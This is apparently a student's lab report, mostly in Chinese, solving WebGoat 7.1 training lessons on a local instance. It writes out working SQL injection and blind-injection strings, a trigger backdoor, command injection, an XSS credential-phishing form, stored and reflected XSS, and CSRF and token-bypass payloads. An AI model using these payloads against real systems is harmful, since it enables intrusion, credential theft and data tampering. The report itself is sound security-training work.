# Lab1.3&1.4&1.5

## Lab1.3

### 1. **Overview**

WebGoat is a deliberately insecure J2EE web application designed to teach web application security lessons. In each lesson, users must demonstrate their understanding of a security issue by exploiting a real vulnerability in the WebGoat application. For example, the user must use SQL injection to steal fake credit card numbers. The application is a realistic teaching environment, providing users with hints and code to further explain the lesson.
Back to the lab, we mainly have two work to do in this lab:

1. Setup WebGoat .
2. Learn how to use WebGoat.

At the base of this lab, we can make further exploration in lab1.4 about web attack.

### 2. 实验过程

进入项目仓库[Release The OWASP WebGoat 7.1 Release · WebGoat/WebGoat (github.com)](https://github.com/WebGoat/WebGoat/releases/tag/7.1)，下载要求的版本 7.1。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/n6iypA.png)

使用 `java -jar webgoat-container-7.1-exec.jar`报错，经过检查是 jdk 版本过高，降级到 1.8 之后成功运行。

降级前（jdk 20）

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/sdCFgl.png)

降级后（jdk 8）

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/EdAZq6.png)

这时候访问[Login Page](http://localhost:8080/WebGoat/login.mvc)，可以看到项目启动成功。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/1IL10Z.png)

使用默认账户 webgoat 登录，登录成功。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/zQlsEM.png)

## **Lab 1.4 Injection & XSS**

### 1. SQL Injection

### **Overview**

In this Lab, you are going to do the Injection and XSS attack in the WebGoat which you have setup and learned to use in lab1.3. Before you start, FireBox browser and some of its plugin such as Tamper Data are recommended to help with your attack.
Back to the lab, what we going to do in this lab:

1. Injection Attack .
2. All kinds of injections in the WebGoat are required to be done. When you have finish a special attack, the WebGoat will check it.

3. XSS Attack.
4. All kinds of XSS in the WebGoat are required to be done. When you have finish a special attack, the WebGoat will check it.

### Step 1 **Command Injection**

这一步主要介绍了如何拼接命令来获取自己需要的信息，我们在命令的最后加上`";ifconfig"`，其中&在 shell 中的含义是后台执行，使其成为`cat "/Users/zhuangyifei/Desktop/tech_Learning/myhomework/third down/sec_program/lab3-4-5/.extract/webapps/WebGoat/plugin_extracted/plugin/CommandInjection/resources/AccessControlMatrix.html";ifconfig""`，后面的 ifconfig 可以让我们获得所需的结果。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/CsRP8r.png)

### Step 2 Numeric SQL injection

这一题我无法编辑 sql 语句，打开检查元素之后发现实际上点击 go 会提交一个表单，所以我将提交的表单的 option 的 value 从 `101` 修改成 `101 or 1=1`，这样实际上后者是一个恒成立的条件，可以把所需要的数据都获得并渲染出来。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/Wf3cp7.png)

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/2Ob2YM.png)

### Step 3 Log Spoofing

这一题主要是需要构造字符串，我们的目标是在日志中另起一行，标记为 Login，那么思路就是在上一行字符串的最后加上\r\n，然后在后面拼上 Login，打到换行输出 Login 的效果。比如，可以构造字符串 htl%0d%0a。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/piQJgw.png)

### Step 4 XPATH Injection

在日常的使用场景中，XPATH 有时候被用来进行查询，如果使用拼接的方式构造 xpath 查询串的话，我们就可以进行注入。

这里我是模仿了上面的 step2，使用 Mike' or 1 = 1 or '1=1 获取到了所需的数据。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/wwiuYN.png)

### Step 5 String SQL Injection

这里构造`Your Name' or '1' = '1`，就可以使得查询条件变成 or 一个恒为`true`的情况，这样可以把所有的数据查询出来。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/i7jSZv.png)

### Step 6 SQL Injection

### Stage 1 String SQL Injection

这里首先还是按照之前的思路，尝试输入`' or '1' = '1`构造恒为 true 的查询条件，发现输入框有长度限制，使用 f12 查看发现 input 标签内部有一个 maxLength 属性

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/ZdaoYc.png)

将这个属性移除之后，在密码框中输入`' or '1' = '1`，这样 SQL 拼接之后就是`SELECT * FROM user_data WHERE last_name = '' OR '1'='1'`，于是就拿到了想要的结果。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/rw6uUW.png)

### Stage 2: Parameterized Query

这一个 stage 说是需要开发版本，但是我不知道怎么运行开发版本，所以暂时还没有找到完成的办法。

### Stage 3: Numeric SQL Injection

这里需要我们用普通员工的身份查询到老板的个人信息，首先我们抓包，可以看到请求是`http://localhost:8080/WebGoat/attack?Screen=1537271095&menu=1100&stage=3`，负载里面是

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/cMJHKQ.png)

我们可以在 employee_id 这里进行注入，回到原来的页面，使用开发者工具可以看到 employee_id 这个属性在一个 input 标签里面，我们将对应的 option 的 value 修改成`101 or '1'='1' ORDER BY salary desc`，这样 SQL 拼接之后就是`SELECT * FROM user_data WHERE employee_id = 101 OR '1'='1' ORDER BY salary desc` ，即可完成注入（这里我们假定老板的工资是最高的）。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/wdYsjc.png)

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/9WEuVB.png)

### Stage 4

这一题和 stage 2 一样，暂时还没有找到完成的办法。

### Step 6 Database BackDoors

##### Stage 1

这一步主要是介绍在语句之后添加恶意 sql 语句进行攻击的方式，我们首先点击 submit，可以看到薪水是 55000，之后我们在输入框中输入`101;update employee set salary = 100000 where userid = 101`,经过 sql 拼接之后就是`select userid, password, ssn, salary, email from employee where userid=101;update employee set salary = 100000 where userid = 101`，我们就可以将薪水更新到 100000。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/EAnR8k.png)

##### Stage 2

这一步主要是在上一步的基础上，在查询的 userid 后面加上创建触发器的语句，实现触发器恶意创建，我们只需要在输入框中输入`101;CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com'WHERE userid = NEW.userid`即可

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/hXMuhy.png)

### Step 7 Blind Numeric SQL Injection

这一题需要我们判断**cc_number**的值是**1111222233334444**的列的 pin 的值，这里我是模仿上面几题进行注入的，我们可以构造输入为`101 and ((select pin from pins where cc_number = '1111222233334444') > number);`，这里 number 可以由我们指定，这样真实执行的 sql 就是`SELECT * FROM user_data WHERE userid=101 and ((select pin from pins where cc_number = '1111222233334444') > number);`，前半句根据题意是为 true，这样只要后半句是 true，整个句子就是 true，我们就可以看到`valid`的输出，如果后半句是 false，那么整句就是 false，我们就可以看到 invalid 的输出。据此我们可以通过变化 number 的值来判断最终 pin 的值，这里我使用二分法进行查询，具体用了以下几个语句。

```sql
# 判断 pin 的长度，这里确定 pin 在 0～10000以内
101 and (length(select pin from pins where cc_number = '1111222233334444') = 4);
# 二分查询
101 and ((select pin from pins where cc_number = '1111222233334444') > 5000); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 2500); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 1250); # true
101 and ((select pin from pins where cc_number = '1111222233334444') > 1875); # true
101 and ((select pin from pins where cc_number = '1111222233334444') > 2187); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 2343); # true
101 and ((select pin from pins where cc_number = '1111222233334444') > 2421); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 2382); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 2362); # true
101 and ((select pin from pins where cc_number = '1111222233334444') > 2372); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 2367); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 2364); # false
101 and ((select pin from pins where cc_number = '1111222233334444') > 2363); # true
# 这里可以判断出结果就是2364
```

最后查询到结果为 2364

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/l138Xs.png)

### Step 8 Blind String SQL Injection

这一题要求我们找到数据库里面 cc_number 是**4321432143214321**的员工的名字，这里模仿上文的思路，使用以下语句进行查询,由于字母作为查询空间并不大，所以这里使用穷举法。

```sql
# 先确定长度
101 and (length(select name from pins where cc_number='4321432143214321') = 4); # true
# 暴力遍历
101 and (left((select name from pins where cc_number='4321432143214321'),1) = 'A'); # false
......
101 and (left((select name from pins where cc_number='4321432143214321'),1) = 'J'); # true
......
101 and (left((select name from pins where cc_number='4321432143214321'),2) = 'Ji'); # true
......
101 and (left((select name from pins where cc_number='4321432143214321'),3) = 'Jil'); # true
......
101 and (left((select name from pins where cc_number='4321432143214321'),4) = 'Jill'); # true
```

最终查询到的结果是`Jill`

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/pH7hYW.png)

注入攻击的部分到这里就结束了，其中 SQL 注入的 Stage2、4 部分询问过助教之后知道了是不需要做的，所以这里没有显示完成。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/mhCxqR.png)

### 2. Cross-Site Scripting (XSS)

### Step 1 Phishing with XSS

这里主要是要求我们利用搜索框伪造一个窃取用户信息的输入框，这里我们插入一个表单实现，代码如下。

```javascript
<form action="http://localhost:8080/WebGoat/catcher?PROPERTY=yes" method="get" name="xss">
    <script>
        function doXss() {
            const XSS = new Image();
            XSS.src = "http://localhost:8080/WebGoat/catcher?PROPERTY=yes&username=" + document.getElementById("_username").innerText + "&password=" + document.getElementById("_password").innerText + "";
            console.log(XSS.src);
        }
    </script>
    <p>username: <input type="text" name="username" id="_username" /></p>
    <p>password: <input type="text" name="password" id="_password" /></p>
    <input type="submit" value="Submit" onclick="doXss()" />
</form>
```

表单能够窃取用户输入的用户名和密码，然后发送到指定的 URL（http://localhost:8080/WebGoat/catcher?PROPERTY=yes）中去，实现窃取的效果。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/mjJ9eo.png)

### Step 2 Cross Site Scripting

#### Stage 1 Stoerd XSS

这里要求我们作为 Tom，在自己的信息的 Street 里面存储一个 XSS 脚本，然后使用 larry 登录并查询 tom 的信息，观察 larry 受到的影响。

我们首先登录 tom 的账号。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/ckQPQL.png)

点击 viewProfile，然后点击 editProfile 进行信息编辑，在 street 最后加上`<script>alert(tom is wating you)</script>`。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/Wa0fjq.png)

然后使用 larry 的账户登录，搜索 tom 的信息，这时候就会有 alert 的信息出来（这里忘记截图 alert 的场景了，不过可以从图里面看出已经完成了 stage 1)。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/r4JsoK.png)

#### Stage 2: Block Stored XSS using Input Validation

这里题目要求使用开发版进行完成，也是找不到完成的入口，暂时先和 SQL 注入部分一样先搁置了，不过我的思路大概是在后端更新 profile 的时候对每一个字段进行检查和过滤，防止 xss 注入。

#### Stage 3: Stored XSS Revisited

这一个 stage 不太明白意思，应该是需要前一个 stage 完成才能实现的，我按照题目的要求登录了 david 的账户，然后查看 bruce 的信息，触发了预先存储的 xss 脚本。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/GpBQtV.png)

#### Stage 4: Block Stored XSS using Output Encoding

这题也是需要开发者版本完成的，所以也是暂时无法完成，不过大致上的思路是在返回页面的时候进行预编译，将 script 脚本转义成正常的文本，以此避免存储的 xss 脚本的执行，实现 xss 攻击的 block 效果。这里我是先登录，然后在 search 的界面里面注入需要执行的 xss 脚本`<script>alert("this is xss");</script>`实现了攻击

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/Litta3.png)

### Step 3 Stored XSS Attack

这里是介绍了一种常见的攻击方式（存储 xss 脚本，这样其他人访问的时候一旦点击，就会触发我们存储的恶意脚本），我们可以在 message 里面填写对应的脚本，即可实现攻击。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/iQbIGi.png)

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/GWju2c.png)

### Step 4 Reflected XSS Attacks

这里介绍了常见的 XSS 的一种攻击方式，反射 xss 攻击，和存储 xss 攻击的不同点在于反射类型的攻击不是存储在服务器上的，往往是动态生成，欺骗用户点击的。这一题我们可以在`Enter your three digit access code`里面进行注入，注入一个脚本`<script>alert('xss atttack')</script>`，即可实现攻击。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/rQVIG3.png)

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/YyGnGn.png)

### Step 5 Cross Site Request Forgery (CSRF)

这里需要我们进行跨站请求伪造攻击，题干要求我们伪造一个转移资金的请求，请求的 URL 是 http://localhost:8080/WebGoat/attack,并且携带Screen,menu和transferFunds三个参数。我们首先查看页面右下角的信息，可以看到screen是2078372，menu 是 900，之后我们就可以构造请求为`http://localhost:8080/WebGoat/attack?Screen=2078372&menu=900&transferFunds=5000"`,这里题目要求使用图片注入，所以我们在 message 框中加入`<img src="http://localhost:8080/WebGoat/attack?Screen=2078372&menu=900&transferFunds=5000" width="1" height="1" />`标签，即可实现攻击。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/dm3YAT.png)

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/JTadqV.png)

### Step 6 CSRF Prompt By-Pass

这里和上一题类似，按照题目的要求，我们需要构造两个恶意请求，第一个请求进行转账，第二个请求对第一个请求进行确认。我们还是先从右下角观察到 screen = "1471017872"，menu = 900，然后构造恶意链接`http://localhost:8080/WebGoat/attack?Screen=2078372&menu=900&transferFunds=5000`和`http://localhost:8080/WebGoat/attack?Screen=2078372&menu=900&transferFunds=CONFIRM`，这里因为使用 iframe 进行完成，所以这里的前缀`http://localhost:8080/WebGoar`可以省略掉，所以最终嵌入 Message 的信息就是

```html
<iframe
    src="attack?Screen= 1471017872&menu=900&transferFunds=5000">
</iframe>
<iframe
    src="attack?Screen= 1471017872&menu=900&transferFunds=CONFIRM">
</iframe>
```

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/9yLgbJ.png)

### Step 7 CSRF Token By-Pass

这里和上一题的区别主要在于我们需要先获取 token，才能发送真正的请求，所以这里我们需要构造一个 iframe，在这里拿到 token 之后拼接好实际的请求，然后使用 fetch 发送这个请求即可。

嵌入 message 的代码

```html
<script>
    function GetToken() {
        var token = document.getElementById('iframe').contentDocument.getElementsByTagName('form')[0][1].value;
        fetch('attack?Screen=803158781&menu=900&transferFunds=5000&CSRFToken=' + token);
    }
</script>


<iframe src='attack?Screen=803158781&menu=900&transferFunds=main' onload='GetToken()' id='iframe' />
```

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/KFHeGb.png)

### Step 8 HttpOnly Test

这一题主要是介绍微软推出的 HttpOnly 参数，主要介绍了这个参数在防止 xss 上的作用。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/HfZjpM.png)

至此 XSS 部分也完成了，截图如下。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/TPwsWn.png)

## Lab 5 **Web Attack**

### **Overview**

Before we start lab1.5, we have to claim that this is an optional lab, which means that you don’t have to do this lab if your time is not allowed. But if you have time and interest to finish this lab and submit a single lab report, you may get 5 points bonus!
So, back to the lab, what we going to do in this lab: Choose two kinds of Web attack in the WebGoat and finish all the related attack items. That’s it!

这里我选择的两种攻击是 Buffer Overflows 攻击和 Insecure Communication 攻击

### Step 1 Buffer Overflows 攻击

1. 首先按照题目指示，自己输入用户名和房间号进入系统

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/ugjvfz.png)

2. 开启 f12 进行抓包，同时我们点击 accept Terms 按钮，可以看到实际发送的是一个 post 请求，负载如下。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/p74WyQ.png)

想要使缓冲区移除，一个朴素的想法是构造溢出的 room_no，这里使用朴素的 bash 脚本拿到长度为 10000 的 1 字符串。

```bash
#!/bin/bash
for i in {1..10000};do
echo -n 1;
done
```

之后在一开始登录的页面的 roomid 位置加入我们拿到的过长的字符串，点击登录，点击 accept term，抓包，可以看到返回值里面多出来了几个 hidden 的值，这些就是 vip 的用户名和房间号。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/iiuiv4.png)

之后使用 vip 账户的信息登录即可。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/A5DLbD.png)

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/kwQ64G.png)

### Step 2 Incure Communiction

#### Stage 1

这个 stage 主要是要求我们抓包，拿到用户的用户名和密码，我们只需要打开 f12，点击 submit 抓包即可。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/l3jwRL.png)

这里可以看到密码是 sniffy，用户名是 Jack，在下面的输入框输入 sniffy 即可完成这个 stage。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/wgkiOb.png)

#### Stage 2

这一步需要我们对 Https 协议发送的数据包进行嗅探和解密，我们首先需要生成一个 https 证书。

```bash
keytool -genkeypair -alias "tomcat" -keyalg "RSA" -keystore "tomcat.keystore" # 生成证书
keytool -selfcert -alias tomcat -keystore tomcat.keystore # 签名证书
keytool -export -alias tomcat -keystore tomcat.keystore -storepass 123456 -rfc -file tomcat.cer #导出证书文件
```

之后我们需要把这个整数添加到 tomcat 的配置文件里，由于我之前是使用 jar 包直接运行的，无法修改内置的 tomcat，所以这里我从 github 上下载了 webgoat 的 7.1 版本的 war 包，之后部署到本地的 tomcat7 环境中，成功运行的截图如下。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/5TS5dv.png)

之后，我将上述生成的整数添加到 tomcat 里，配置 server.xml 如下

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/gXDlQQ.png)

在浏览器钟访问`https://localhost:8443/webgoat-container-7.0.1/login.mvc#attack/489/1300`，即可发现配置成功。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/HksjFI.png)

之后还是进入 stage 2，进行登录之后选择密码非明文，加密方式为 TLS 即可通过测试。

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/zUeEKs.png)

![](https://hutao-image-bed.oss-cn-hangzhou.aliyuncs.com/uPic/PyBPTQ.png)

本次实验 Lab 1.3&1.4&1.5 到此结束。
